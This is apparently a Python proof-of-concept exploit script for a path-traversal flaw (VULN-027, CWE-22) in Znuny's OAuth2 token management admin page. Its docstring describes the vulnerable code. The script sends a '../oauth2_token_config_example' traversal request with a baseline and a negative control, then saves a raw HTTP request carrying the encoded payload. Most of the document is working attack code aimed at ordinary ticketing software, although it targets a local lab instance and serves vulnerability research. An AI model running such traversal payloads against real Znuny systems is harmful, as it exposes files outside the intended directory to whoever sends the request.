#!/usr/bin/env python3
r"""
VULN-027 — AdminOAuth2TokenManagement TokenConfigTemplateFilename cross-dir *.yml read
======================================================================================
Vulnerable code : targets/Znuny/Kernel/Modules/AdminOAuth2TokenManagement.pm:366, 977-983
Vulnerability   : CWE-22 Path Traversal (reflected file read, .yml-constrained)

Flaw
----
Subaction=AddTokenConfigByTemplateFile reads the attacker parameter
`TokenConfigTemplateFilename` (line 366) and builds:

    my $TokenConfigTemplateFilePath = $Self->{TokenConfigTemplateFilesBasePath}
        . '/' . $Param{TokenConfigTemplateFilename} . '.yml';   # line ~977
    ... FileRead( Location => $TokenConfigTemplateFilePath );   # line ~979

No `../` filtering / abs_path confinement. `.yml` is hard-appended (so the read is
constrained to files ending .yml), but the base dir
(`$Home/scripts/OAuth2TokenManagement/TokenConfigTemplates`) can be escaped with `../`,
and any file that parses as a YAML *array of templates* is reflected back into the Edit
form (Name/ClientID/…) — cross-directory content disclosure. No CSRF token on this subaction.

Proof: reading `../oauth2_token_config_example` (a .yml *outside* the base dir) reflects that
file's distinctive content ("Microsoft Outlook …"), while a nonexistent path returns the Error
screen — showing FileRead genuinely escaped the intended directory.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

HERE = os.path.dirname(os.path.abspath(__file__))

def probe(a, fn):
    r = a.get({"Action": "AdminOAuth2TokenManagement",
               "Subaction": "AddTokenConfigByTemplateFile",
               "TokenConfigTemplateFilename": fn})
    import re
    t = re.search(r"<title>([^<]*)</title>", r.text)
    return (t.group(1) if t else "?"), r.text

def main():
    C.banner("VULN-027", "AdminOAuth2TokenManagement cross-dir *.yml read",
             ["sink: AdminOAuth2TokenManagement.pm:977 FileRead(base.'/'.$Filename.'.yml') — no ../ filter",
              "Subaction=AddTokenConfigByTemplateFile — no ChallengeToken"])

    C.log("SETUP", f"logging in as admin {C.ADMIN_USER}")
    a = C.agent_client(C.ADMIN_USER, C.ADMIN_PASS)

    # in-base baseline: proves the reflection mechanism with a legitimate template.
    C.log("STEP", "baseline: TokenConfigTemplateFilename=GoogleMail (inside base dir)")
    bt, _ = probe(a, "GoogleMail")
    C.log("PROOF", f"baseline title -> {bt!r}")

    # traversal: read a .yml OUTSIDE the TokenConfigTemplates base dir and reflect it.
    C.log("STEP", "traversal: TokenConfigTemplateFilename=../oauth2_token_config_example (OUTSIDE base)")
    tt, tbody = probe(a, "../oauth2_token_config_example")
    marker = "Microsoft Outlook"          # content ONLY present in the out-of-base file
    leaked = marker in tbody
    C.log("PROOF", f"traversal title -> {tt!r}; out-of-base marker '{marker}' reflected: {leaked}")

    # negative control: nonexistent -> Error screen (file not read).
    C.log("STEP", "control: nonexistent ../zzz_%s" % C.rid())
    ct, _ = probe(a, "../zzz_%s" % C.rid())
    C.log("PROOF", f"control title -> {ct!r}")

    open(os.path.join(HERE, "request.http"), "w").write(
        "GET /znuny/index.pl?Action=AdminOAuth2TokenManagement;"
        "Subaction=AddTokenConfigByTemplateFile;"
        "TokenConfigTemplateFilename=..%2Foauth2_token_config_example HTTP/1.1\r\n"
        "Host: localhost:25114\r\nCookie: OTRSAgentInterface=<admin>\r\n")
    open(os.path.join(HERE, "response.txt"), "w").write(
        f"traversal title: {tt}\nout-of-base marker reflected: {leaked}\n"
        f"control (nonexistent) title: {ct}\n")

    if leaked and "Error" not in tt and "Error" in ct:
        C.confirmed("../oauth2_token_config_example (a .yml OUTSIDE the TokenConfigTemplates "
                    "base) was read and its content reflected into the Edit form, while a "
                    "nonexistent path errored — cross-directory *.yml file read as admin "
                    "(no CSRF token).")
    else:
        C.failed(f"differential not clean: traversal={tt!r} leaked={leaked} control={ct!r}")

if __name__ == "__main__":
    main()
